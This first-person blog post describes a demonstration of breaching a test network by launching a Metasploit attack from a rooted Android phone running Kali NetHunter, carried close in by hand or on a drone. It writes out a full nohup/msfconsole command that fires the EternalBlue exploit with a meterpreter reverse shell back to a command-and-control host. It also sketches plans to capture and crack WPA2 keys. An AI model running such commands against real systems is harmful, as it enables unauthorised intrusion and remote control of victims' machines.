# Hacking a Computer Remotely through a Phone
In a recent demonstration of cyber and electronic warfare capabilities, I had the opportunity to enable access into a network by exploiting a computer remotely through a cell phone. In this blog post, I’ll document some of the challenges that were encountered and how they were overcome.
# Scenario
The scenario for this demonstration was: an offensive cyber operations team wants to gain access into a targeted computer network which includes a wireless access point. The targeted network is firewalled and NAT’d, and social engineering techniques such as spear phishing have been unsuccessful. In order to gain access into the network, a human source is used to approach the facility that houses the network (think a residential building) and gains close enough proximity to sense the radio frequency (RF) emissions from the facility.

In this scenario, the human source cannot get a laptop into range of the WiFi emissions, but something smaller like a phone can be brought close enough. A partner organization (undisclosed due to NDA) provides an application for rooted Android devices that can control the radios on that Android device for sampling the RF spectrum. The human source does not necessarily know how to hack and may not be able to do so surreptitiously, but that tool also enables terminal access to the cell phone. From that starting point, we made a concept of operations that is illustrated in the following picture, where a remote operator would connect to the terminal of the phone, then launch an attack over the wireless network to the targeted computer.
 ![](DraggedImage.tiff)
Taking a crawl, walk, run approach, this scenario had a pre-identified target connected to an unsecured wireless network. This was also a closed LAN, so the cloud in the above picture really represents a network created through five Linksys WRT54G routers, with one acting as a core router and the other four as boundary routers for different “cities”.
# Kali Nethunter
The first thing I wanted to figure out was how to launch an exploit from a cell phone. The [Kali NetHunter](https://www.kali.org/kali-nethunter/) project allows you to install Kali onto a cell phone, including the Metasploit framework. I had a rooted Android phone at my disposal which had [Magisk](https://magisk.me) installed. Conveniently, Magisk has a module for NetHunter, so I downloaded the module and rebooted the device.

NetHunter uses a [chroot](https://man7.org/linux/man-pages/man2/chroot.2.html) to provide a filesystem to the utilities from the distribution.  You have the option of downloading the chroot from within NetHunter or downloading one manually and moving it to `/sdcard`. I manually downloaded the full chroot, moved it to `/sdcard` and then selected it with the Kali Chroot Manager. Next, I had to install a terminal emulator. I tried the Terminal Emulator for Android app, but Kali would not recognize it. The solution that worked for me was to download the [NetHunter Store](https://store.nethunter.com) and then install NetHunter Terminal from it.
## Accessing Kali Utilities Outside of NetHunter Terminal
The second thing I wanted to do was figure out how to access Kali utilities without launching the NetHunter Terminal. The remote terminal access to the phone did not have full interactive capabilities but provided the ability to launch arbitrary shell commands. Looking into the Kali NetHunter scripts, I found the chroot contents got extracted to `/data/local/nhsystem/kali-armhf`. The `chroot` help page says that I can execute commands as `chroot /path/to/chroot cmd args`. Combining that knowledge, I ran a test command which simply echo’d from the chroot.
Next was to craft a single command to execute a Metasploit command. The `msfconsole -x` command lets you “execute the specified string as a console command”. You can chain those strings together with semi-colons. For example, to craft a whole exploit you might use it as `msfconsole -x "use exploit; set target; set payload; exploit"`.
## SIGHUP
With a proof of concept for launching a Metasploit command from a remote session on the phone, we started doing mission rehearsal. During this time, I realized that I wouldn’t be able to launch the command once the phone had been joined to the Wifi network. The app that we were using to control the radios and to provide remote access did not have the ability to direct certain traffic (our C2 channel) through the cellular radio and other traffic (Metasploit) through the Wifi radio. “No problem”, we thought, just put a delay on command execution, as in `sleep 30; msfconsole -s`. Unfortunately, when the network changed from cell to Wifi, our TCP connection to the phone was severed, generating a [SIGHUP](https://en.wikipedia.org/wiki/SIGHUP) which resulted in the whole process tree being killed.
Thankfully, it is easy to prevent a process from dying when it receives the SIGHUP by using the `nohup` command and that command was present on the Android phone. The full command became:
  nohup /bin/sh -c "sleep 30; chroot /data/local/nhsystem/kali-armhf msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts 192.168.10.4; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.1.10; set lport 4444; exploit\"" &
I kicked the command off, our close access operator connected the phone to the Wifi network, and soon we had a shell from the target back to a C2 node attached to the “core” Linksys router. In another test, we strapped the phone to a DJI drone and added the `nmcli dev wifi connect network-ssid` command to the previous command to switch networks.
# Future Tests
As noted earlier, this event was part of a series following the crawl, walk, run methodology. As the crawl step, this event used an open Wifi network and a simple off the shelf exploit. For future events, we’d be looking at performing a packet capture using the capabilities of the partner’s Android application or by adding [Aircrack-ng](http://aircrack-ng.org) to the phone. After obtaining a packet capture from the Wifi radio, the results would get exfiltrated back to the operations center, where the WPA2 pre-shared key could be cracked, and used to join the phone to the network. We could also do more work with specialized antennas to allow the drone to be at a greater stand off distance, reducing its observability and increasing its survivability.